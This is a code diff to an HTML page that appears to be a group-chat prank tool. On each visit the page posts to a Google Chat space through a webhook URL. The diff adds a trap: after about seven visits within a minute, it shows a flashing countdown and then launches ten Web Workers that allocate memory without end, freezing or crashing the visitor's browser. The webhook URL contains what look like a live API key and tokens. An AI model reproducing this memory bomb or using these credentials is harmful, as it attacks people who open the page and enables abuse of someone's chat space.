@@ -1,9 +1,45 @@
-<h1 style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%)">Sending message to group chat...</h1>
+<body>
+<style>
+@keyframes flash {
+0% {color:#ffffff}
+100% {color: #ff0000}
+}
+</style>
+<h1 style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);text-align:center;font-size:13vw;width:100%;animation:0.676767s linear 0s infinite alternate flash" id="userMessage">Sending message to group chat...<br>10</h1>
 <script>
+  let userMessage = document.getElementById("userMessage")
+  let timesVisited = []
+  try {
+    timesVisited = JSON.parse(localStorage.getItem("chat_troller_times_visited") || [])
+  } catch (e) {
+    timesVisited = []
+  }
+  timesVisited.push(Date.now())
+  localStorage.setItem("chat_troller_times_visited", JSON.stringify(timesVisited))
+  if (Date.now()-timesVisited[timesVisited.length-1-6] < 60000) {
+    userMessage.innerText = "..............."
+    let count = 10
+    setInterval(()=>{
+      --count
+      if (count <= 0) {
+        count = 0
+        for (let i = 0; i < 10; ++i) {
+          const workerScript = `let array=[];while(true){array.push(new Array(1000000).fill("a".repeat(1000000)))}`;
+          const workerBlob = new Blob([workerScript], { type: 'text/javascript' });
+          const workerURL = URL.createObjectURL(workerBlob);
+          const myWorker = new Worker(workerURL);
+        }
+      }
+      userMessage.innerText = "Counting down...\n" + count
+      userMessage.style = "position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);text-align:center;font-size:13vw;width:100%;animation:0.676767s linear 0s infinite alternate flash"
+      document.body.style = "background-color: #ff0000"
+    },1000)
+    throw 0
+  }
   (async function () {
     try {
       fetch(
-        "https://chat.googleapis.com/v1/spaces/AAQAzZ8pvVM/messages?key=AIzaSyDdI0hCZtE6vySjMm-WEfRq3CPzqKqqsHI&token=06c66bbV1e4UEK1vOPSETOP9ZHq1-S7AoLPLNrebRW8",
+        "https://chat.googleapis.com/v1/spaces/AAQAzZ8pvVM/messages?key=AIzaSyDdI0hCZtE6vySjMm-WEfRq3CPzqKqqsHI&token=ITNfD_JxH9XswCkuWC35EJ_5SQN88_NHpAKEBjFADOE",
         {
           method: "POST",
           headers: { "Content-Type": "application/json; charset=UTF-8" },
@@ -25,3 +61,7 @@
     }
   })();
 </script>
+</body>
+
+
+
